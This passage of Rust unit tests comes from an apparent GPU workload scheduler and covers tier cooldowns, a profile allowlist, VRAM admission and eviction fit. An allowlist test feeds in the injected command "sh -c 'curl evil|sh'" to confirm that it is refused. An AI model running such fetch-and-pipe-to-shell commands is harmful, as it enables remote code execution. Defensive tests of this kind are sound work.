        let cd = Some((Tier::Batch, t0 + Duration::from_secs(8)));
        // The just-preempted batch is blocked while the dwell is active...
        assert!(cooling_down(cd, Tier::Batch, t0));
        // ...but interactive (top priority) is never delayed, even mid-dwell.
        assert!(!cooling_down(cd, Tier::Interactive, t0));
        // A different tier isn't affected by batch's cooldown.
        assert!(!cooling_down(cd, Tier::BestEffort, t0));
        // After the dwell expires, batch may re-acquire.
        assert!(!cooling_down(cd, Tier::Batch, t0 + Duration::from_secs(9)));
        // No cooldown set → never blocked.
        assert!(!cooling_down(None, Tier::Batch, t0));
    }

    #[test]
    fn profile_allowlist_resolves_known_rejects_unknown() {
        // Known profiles resolve to an absolute, daemon-owned command (no caller binary).
        let comfy = resolve_profile("comfyui").unwrap();
        assert!(comfy[0].starts_with('/') && comfy[0].ends_with("start-comfyui.sh"));
        let blender = resolve_profile("blender-render").unwrap();
        assert!(blender[0].starts_with('/') && blender[0].ends_with("render-wrapper.sh"));
        // ADR-0023 P1: the EEVEE lane is its OWN allowlisted profile (distinct name), resolving to the
        // same hardened wrapper as the Cycles lane — the lease-layer distinction is the footprint.
        let eevee = resolve_profile("eevee-render").unwrap();
        assert!(eevee[0].starts_with('/') && eevee[0].ends_with("render-wrapper.sh"));
        assert_eq!(resolve_profile("sleep").unwrap(), vec!["/usr/bin/sleep".to_string()]);
        // Anything else — including an attempted binary path — is refused (closes S1 RCE).
        assert!(resolve_profile("/bin/sh").is_none());
        assert!(resolve_profile("sh -c 'curl evil|sh'").is_none());
        assert!(resolve_profile("").is_none());
    }

    #[test]
    fn eevee_render_is_admittable_where_cycles_would_deny() {
        // The reason `eevee-render` exists (ADR-0023 P1): against ComfyUI's ~5.8 GB residual headroom,
        // the Cycles `blender-render`'s ~8000-MiB estimate ALWAYS denies, but the lighter EEVEE estimate
        // fits, so a render can be admitted beside a warm model.
        let free = 5_800u64; // ComfyUI residual headroom
        let cycles_est = 8_000u64;
        assert!(
            !admit(free, cycles_est, headroom_for(cycles_est)).granted(),
            "the Cycles estimate must deny against ~5.8 GB free"
        );
        let eevee_est = EEVEE_RENDER_EST_MIB as u64;
        assert!(
            admit(free, eevee_est, headroom_for(eevee_est)).granted(),
            "the conservative EEVEE estimate must be admittable against the same headroom"
        );
    }

    #[test]
    fn fits_after_evict_completes_the_preempt_decision() {
        // Reclaimable 2GB victim, 20GB successor, 4GB free → predicted 6GB < 20GB → WONT-FIT.
        assert!(!fits_after_evict(4_000, 2_000, true, 20_000, headroom_for(20_000)));
        // Reclaimable big victim makes room for the successor → fits.
        assert!(fits_after_evict(2_000, 19_000, true, 18_000, 512));
        // Cooperative victim (not reclaimable) frees nothing → only current free counts.
        assert!(!fits_after_evict(4_000, 19_000, false, 18_000, 512));
        assert!(fits_after_evict(20_000, 0, false, 18_000, 512));
    }
}
